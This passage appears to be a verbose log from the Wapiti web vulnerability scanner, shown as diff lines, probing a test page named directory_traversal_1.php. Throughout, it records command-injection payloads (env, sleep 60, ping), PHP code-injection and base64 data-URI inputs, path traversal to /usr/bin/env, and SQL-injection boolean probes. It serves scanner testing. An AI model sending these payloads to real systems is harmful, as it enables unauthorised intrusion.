+2024-03-20 16:55:11.499 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%3Benv%3B&security_level=2
+2024-03-20 16:55:11.508 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%0Aenv%3B&security_level=2
+2024-03-20 16:55:11.515 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%26set%26&security_level=2
+2024-03-20 16:55:11.524 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=set&security_level=2
+2024-03-20 16:55:11.533 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=env&security_level=2
+2024-03-20 16:55:11.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%2Fe%00&security_level=2
+2024-03-20 16:55:11.556 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:11.565 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:11.573 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:11.580 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:11.587 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:11.596 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:11.602 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:11.611 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:11.617 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:11.628 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:11.634 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:55:11.643 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:55:11.650 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&security_level=2
+2024-03-20 16:55:11.659 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%60%29%60&security_level=2
+2024-03-20 16:55:11.666 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%60sleep%2060%60&security_level=2
+2024-03-20 16:55:11.678 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%3Bsleep%2060%3B&security_level=2
+2024-03-20 16:55:11.684 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%7Csleep%2060%3B&security_level=2
+2024-03-20 16:55:11.693 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%26ping%20-n%2025%20127.0.0.1%26&security_level=2
+2024-03-20 16:55:11.701 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%3Benv%3B
+2024-03-20 16:55:11.711 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%7Cenv%7C
+2024-03-20 16:55:11.717 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%3Benv%3B
+2024-03-20 16:55:11.726 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%3Benv%3B
+2024-03-20 16:55:11.733 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 16:55:11.743 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%3Benv%3B
+2024-03-20 16:55:11.750 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%0Aenv%3B
+2024-03-20 16:55:11.760 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%26set%26
+2024-03-20 16:55:11.767 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=set
+2024-03-20 16:55:11.781 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=env
+2024-03-20 16:55:11.794 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%2Fe%00
+2024-03-20 16:55:11.808 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:11.821 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:11.835 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:11.848 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:11.861 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:11.874 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:11.884 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:11.894 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:11.901 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:11.911 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:11.923 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:11.934 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:11.945 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 16:55:11.956 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%60%29%60
+2024-03-20 16:55:11.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%60sleep%2060%60
+2024-03-20 16:55:11.977 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%3Bsleep%2060%3B
+2024-03-20 16:55:11.990 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=a%7Csleep%2060%3B
+2024-03-20 16:55:12.002 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 16:55:12.020 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105
+2024-03-20 16:55:12.022 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%3Benv%3B&bug=105
+2024-03-20 16:55:12.033 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%7Cenv%7C&bug=105
+2024-03-20 16:55:12.043 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%3Benv%3B&bug=105
+2024-03-20 16:55:12.054 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%3Benv%3B&bug=105
+2024-03-20 16:55:12.065 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&bug=105
+2024-03-20 16:55:12.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%3Benv%3B&bug=105
+2024-03-20 16:55:12.088 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%0Aenv%3B&bug=105
+2024-03-20 16:55:12.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%26set%26&bug=105
+2024-03-20 16:55:12.110 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=set&bug=105
+2024-03-20 16:55:12.123 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=env&bug=105
+2024-03-20 16:55:12.134 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2Fe%00&bug=105
+2024-03-20 16:55:12.145 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=105
+2024-03-20 16:55:12.157 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=105
+2024-03-20 16:55:12.168 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=105
+2024-03-20 16:55:12.176 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=105
+2024-03-20 16:55:12.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=105
+2024-03-20 16:55:12.192 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=105
+2024-03-20 16:55:12.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=105
+2024-03-20 16:55:12.208 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=105
+2024-03-20 16:55:12.215 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=105
+2024-03-20 16:55:12.224 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=105
+2024-03-20 16:55:12.232 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=105
+2024-03-20 16:55:12.240 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=105
+2024-03-20 16:55:12.248 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&bug=105
+2024-03-20 16:55:12.256 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%60%29%60&bug=105
+2024-03-20 16:55:12.264 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%60sleep%2060%60&bug=105
+2024-03-20 16:55:12.273 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%3Bsleep%2060%3B&bug=105
+2024-03-20 16:55:12.281 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=a%7Csleep%2060%3B&bug=105
+2024-03-20 16:55:12.289 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%26ping%20-n%2025%20127.0.0.1%26&bug=105
+2024-03-20 16:55:12.300 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%3Benv%3B
+2024-03-20 16:55:12.310 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%7Cenv%7C
+2024-03-20 16:55:12.317 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%3Benv%3B
+2024-03-20 16:55:12.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%3Benv%3B
+2024-03-20 16:55:12.333 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 16:55:12.341 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%3Benv%3B
+2024-03-20 16:55:12.349 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%0Aenv%3B
+2024-03-20 16:55:12.361 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%26set%26
+2024-03-20 16:55:12.368 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=set
+2024-03-20 16:55:12.377 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=env
+2024-03-20 16:55:12.385 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%2Fe%00
+2024-03-20 16:55:12.393 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:12.401 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:12.410 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:12.418 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:12.429 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:12.436 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:12.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:12.452 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:12.461 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:12.470 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:12.479 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:55:12.487 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:55:12.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 16:55:12.509 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%60%29%60
+2024-03-20 16:55:12.522 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%60sleep%2060%60
+2024-03-20 16:55:12.534 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%3Bsleep%2060%3B
+2024-03-20 16:55:12.550 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=a%7Csleep%2060%3B
+2024-03-20 16:55:12.564 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 16:55:12.604 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 16:55:12.618 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:12.628 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 16:55:12.729 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 16:55:12.742 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:12.743 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 16:55:12.770 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%20AND%2058%3D128%20AND%2077%3D77 (0)
+2024-03-20 16:55:12.800 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%27%20AND%2084%3D138%20AND%20%2721%27%3D%2721 (0)
+2024-03-20 16:55:12.829 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%22%20AND%2062%3D86%20AND%20%2241%22%3D%2241 (0)
+2024-03-20 16:55:12.856 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%29%20AND%2020%3D71%20AND%20%2827%3D27 (0)
+2024-03-20 16:55:12.882 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%27%29%20AND%2083%3D155%20AND%20%28%2754%27%3D%2754 (0)
+2024-03-20 16:55:12.907 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%22%29%20AND%2032%3D82%20AND%20%28%2261%22%3D%2261 (0)
+2024-03-20 16:55:12.946 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:12.969 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:12.986 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%20AND%2075%3D97%20AND%2016%3D16 (2)
+2024-03-20 16:55:13.011 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%20AND%2042%3D74%20AND%2055%3D55 (2)
+2024-03-20 16:55:13.034 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%20AND%2040%3D40%20AND%2058%3D58 (2)
+2024-03-20 16:55:13.117 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%27%20AND%2073%3D132%20AND%20%2720%27%3D%2720 (2)
+2024-03-20 16:55:13.141 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%27%20AND%2022%3D120%20AND%20%2795%27%3D%2795 (2)
+2024-03-20 16:55:13.165 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%27%20AND%2035%3D35%20AND%20%2779%27%3D%2779 (2)
+2024-03-20 16:55:13.192 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%22%20AND%2013%3D35%20AND%20%2274%22%3D%2274 (2)
+2024-03-20 16:55:13.217 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%22%20AND%2068%3D130%20AND%20%2227%22%3D%2227 (2)
+2024-03-20 16:55:13.245 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%22%20AND%2095%3D95%20AND%20%2242%22%3D%2242 (2)
+2024-03-20 16:55:13.271 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%29%20AND%2065%3D159%20AND%20%2822%3D22 (2)
+2024-03-20 16:55:13.299 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%29%20AND%2094%3D128%20AND%20%2851%3D51 (2)
